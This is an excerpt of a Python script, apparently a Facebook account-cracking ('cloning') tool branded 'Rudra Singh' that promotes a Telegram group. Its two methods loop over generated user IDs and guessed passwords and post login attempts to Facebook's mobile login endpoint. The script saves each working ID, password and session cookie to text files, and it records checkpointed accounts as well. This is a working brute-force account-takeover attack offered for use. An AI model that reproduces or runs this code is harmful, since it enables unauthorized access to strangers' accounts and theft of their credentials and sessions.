# SCRIPT GIFT BY RUDRA SINGH 

# JOIN GROUP : https://t.me/RUDRA SINGH
...
ascii_art = pyfiglet.figlet_format("RUDRA SINGH", font="small")
...
def mrpoco():
    ...
    if ___option___ in ["1"]:os.system('xdg-open https://t.me/RUDRA SINGH');poco.append('1');______randomxmenu_______()

    elif ___option___ in ["2"]:os.system('xdg-open https://t.me/RUDRA SINGH');poco.append('2');______randomxmenu_______()

    elif ___option___ in ["3"]:os.system('xdg-open https://t.me/RUDRA SINGH');poco.append('3');______randomxmenu_______()

    elif ___option___ in ["4"]:os.system('xdg-open https://t.me/RUDRA SINGH');poco.append('4');______randomxmenu_______()

    elif ___option___ in ["5"]:os.system('xdg-open https://t.me/RUDRA SINGH');poco.append('5');______randomxmenu_______()

    elif ___option___ in ["6"]:os.system('xdg-open https://t.me/RUDRA SINGH');poco.append('6');______randomxmenu_______()
...
def ______randomxmenu_______():
    ...
    if "6" in poco:print(f"{xd} EXAMPLE {R}:{G} 0113 {R}|{G} 0116 {R}|{G} 0112 {R}|{G} 0119 ");linex()
...
def ____methodA____(ids,pasx,tl):
    ...
    sys.stdout.write(f'\r\r{xd}-{R}[{G}RUDRA SINGH-M1{R}]-[{W}{loop}{R}]-[{G}{ok}{R}]-[{Y}{cp}{R}] ');sys.stdout.flush()
    ...
    for pw in pasx:
        ...
        try:
           ...
           'viewport-width': '980',}
            response = ewe.post("https://m.facebook.com/ig/login_via/app/",
            ...
            if "checkpoint" in ewe.cookies.get_dict():
                ...
                print(f"\r{xd}-{R}[{Y}RUDRA SINGH-CP{R}]{Y} {uid} | {pw} ")

                open('/sdcard/RUDRA SINGH-M1-RANDOM-CP.txt','a').write(uid+'|'+pw+'\n')
                ...
                if 'LIVE' in response:
                    ...
                    print(f"\r{xd}-{R}[{G}RUDRA SINGH-OK{R}]{G} {uid} | {pw} ")

                    print(f"\r{R}[\U0001F4A5{R}]{G} {kuki} ");print(f"{W}{47*'-'}")

                    open('/sdcard/RUDRA SINGH-M1-RANDOM-OK.txt','a').write(uid+'|'+pw+'|'+kuki+'\n')
...
def ____methodB____(ids,pasx,tl):
        ...
        sys.stdout.write(f'\r\r{xd}-{R}[{G}RUDRA SINGH-M2{R}]-[{W}{loop}{R}]-[{G}{ok}{R}]-[{Y}{cp}{R}] ');sys.stdout.flush()
                ...
                for pw in pasx:
                        ...
                        if 'session_key' in po:
                                        ...
                                        if 'LIVE' in response:
                                            ...
                                            open('/sdcard/RUDRA SINGH-M2-RANDOM-OK.txt','a').write(uid+'|'+pw+'|'+coki+'\n')
                                        ...
                                        open('/sdcard/RUDRA SINGH-M2-RANDOM-CP.txt','a').write(uid+'|'+pw+'\n')
